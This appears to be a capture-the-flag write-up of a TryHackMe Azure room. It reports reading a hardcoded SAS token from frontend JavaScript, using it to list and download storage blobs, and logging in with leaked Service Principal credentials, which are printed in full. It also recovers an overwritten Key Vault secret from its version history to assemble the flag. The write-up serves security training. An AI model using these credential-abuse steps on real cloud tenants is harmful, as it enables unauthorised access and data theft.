# CryptoCabana

**Platform:** TryHackMe 
**Date:** 2026-08-05 
**Difficulty:** Medium 
**Category:** Cloud / Azure Security
**Room URL:** https://tryhackme.com/room/cryptocabana 
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

> This room was about finding security misconfigurations in Azure cloud infrastructure. The goal was to exploit leaked SAS tokens, abuse hardcoded Service Principal credentials, and dig into Azure Key Vault secret version history to piece together the flag.

---

## 🔍 Reconnaissance

### Nmap Scan

Since this room used direct Azure Portal URLs rather than a target IP, a traditional nmap scan wasn't needed. Instead I went straight to auditing the web application directly.

|Port|Service|Version|Notes|
|---|---|---|---|
|443|HTTPS|Microsoft-HTTPAPI/2.0|Static Web Endpoint hosting the CryptoCabana app|

---

## 🧭 Steps I Took

### Step 1 — Digging into the Frontend Source Code

- **What I did:** I curled the homepage to look at the HTML and see what scripts were being loaded.
- **Command/Tool used:**

```bash
# curl -s https://windows.net
```

- **What I found:** There was a JavaScript file called `app.js` linked at the bottom of the page.
- **Why it matters:** Frontend JS files are a goldmine for hardcoded secrets that developers forget to strip out before deploying.

### Step 2 — Reading app.js

- **What I did:** I fetched `app.js` and went through it to see how the Recovery Phrase form was handling data.
- **Command/Tool used:**

```bash
# curl -s https://windows.net
```

- **What I found:** Jackpot 🎉 — a hardcoded Azure Storage Account name (`cryptocabanaf5scjagc`), a container name (`backups`), and a fully exposed SAS token (`?sv=2022-11-02&ss=b&srt=sco&sp=rl...`).
- **Why it matters:** The SAS token had `sp=rl` (Read and List) permissions across Service, Container, and Object scopes. That means I could browse the entire storage account without needing any account credentials at all.

### Step 3 — Listing All Storage Containers

- **What I did:** The `backups` container was empty so I used the SAS token to list every container in the storage account.
- **Command/Tool used:**

```bash
# az storage container list \
  --account-name "cryptocabanaf5scjagc" \
  --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31..." \
  --output table
```

- **What I found:** Three containers — `$web`, `backups`, and a suspicious one called `vault`. 👀
- **Why it matters:** A container literally called `vault` in a crypto-themed room? Time to go digging.

### Step 4 — Inspecting the vault Container

- **What I did:** I listed the contents of the `vault` container.
- **Command/Tool used:**

```bash
# az storage blob list \
  --account-name "cryptocabanaf5scjagc" \
  --container-name "vault" \
  --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31..." \
  --output table
```

- **What I found:** Two files — `seed_phrase.txt` and `backup-service-account.json`. Oh yeah 😏
- **Why it matters:** These are exactly the kinds of files that can give you the keys to the entire kingdom.

### Step 5 — Downloading the Leaked Credentials

- **What I did:** I downloaded both files to see what was inside.
- **Command/Tool used:**

```bash
# az storage blob download \
  --account-name "cryptocabanaf5scjagc" \
  --container-name "vault" \
  --name "backup-service-account.json" \
  --file "service_account.json" \
  --sas-token "[SAS_TOKEN]"
# cat service_account.json
```

- **What I found:** `seed_phrase.txt` had a crypto wallet recovery phrase. But the real prize was `service_account.json` — it had a `client_id`, `client_secret`, `tenant_id`, and a Key Vault URL all sitting there in plaintext.
- **Why it matters:** Service Principal credentials let you authenticate to Azure as an automated system account. If those leak, an attacker can log straight into your cloud environment. Which is exactly what I did next 😈

### Step 6 — Logging in as the Service Principal and Raiding the Key Vault

- **What I did:** I used the leaked credentials to log into Azure CLI as the Service Principal, then listed everything inside the Key Vault.
- **Command/Tool used:**

```bash
# az login --service-principal \
  -u "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" \
  -p "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" \
  --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"

# az keyvault secret list --vault-name "ccabana-kv-f5scjagc" --output table
```

- **What I found:** Four secrets — `key-shard-1`, `key-shard-2`, `key-shard-3`, and `master-key`. Shard 1 gave me `THM{n0t_ur` and Shard 3 gave me `ur_c01ns!}`. But Shard 2 had been overwritten with an IT rotation notice. So close! 😤

### Step 7 — Pulling Secret Version History to Get the Missing Shard

- **What I did:** Azure Key Vault keeps a history of every version of a secret even after it gets overwritten. I pulled the version history for `key-shard-2` and grabbed the original value.
- **Command/Tool used:**

```bash
# az keyvault secret list-versions \
  --name "key-shard-2" \
  --vault-name "ccabana-kv-f5scjagc" \
  --output json

# az keyvault secret show \
  --name "key-shard-2" \
  --vault-name "ccabana-kv-f5scjagc" \
  --version "PREVIOUS_VERSION_ID" \
  --query value --output tsv
```

- **What I found:** The original middle shard — `_k3ys_n0t_`. Put all three together and BOYAH 🎉

---

## 🛠 Commands Used

|Command|What It Does|
|---|---|
|`curl -s [URL]`|Fetches web page source silently|
|`az storage container list`|Lists all containers in an Azure storage account|
|`az storage blob list`|Lists all files inside a specific container|
|`az storage blob download`|Downloads a file from Azure blob storage|
|`az login --service-principal`|Logs into Azure CLI using Service Principal credentials|
|`az keyvault secret list`|Lists all secrets stored in an Azure Key Vault|
|`az keyvault secret list-versions`|Shows version history for a specific secret|
|`az keyvault secret show --version`|Retrieves a specific historical version of a secret|

---

## 🚩 Flags Found

|Flag|Value|
|---|---|
|Combined Key Shard Flag|`THM{n0t_ur_k3ys_n0t_ur_c01ns!}`|

---

## 💡 What I Learned

- Never hardcode SAS tokens or Service Principal credentials into frontend JavaScript files — anyone can read them.
- A broadly scoped SAS token (`srt=sco`, `sp=rl`) lets an attacker browse your entire storage account, not just the directory you intended to expose.
- Azure Key Vault keeps the full version history of every secret. Rotating a compromised secret doesn't erase the old value — you need explicit purge policies for that.

---

## ❓ What Confused Me / What to Research Next

- I ran into string truncation issues when pasting long URLs with multiple query parameters into the web terminal. Need to practice splitting long inputs into variables.
- Want to research how to properly purge Key Vault secret version history during emergency remediation.

---

## 📎 Resources Used

- Microsoft Documentation: Azure CLI Storage Command Reference
- [TryHackMe Bash Cheat Sheet](https://tryhackme.com/)

---
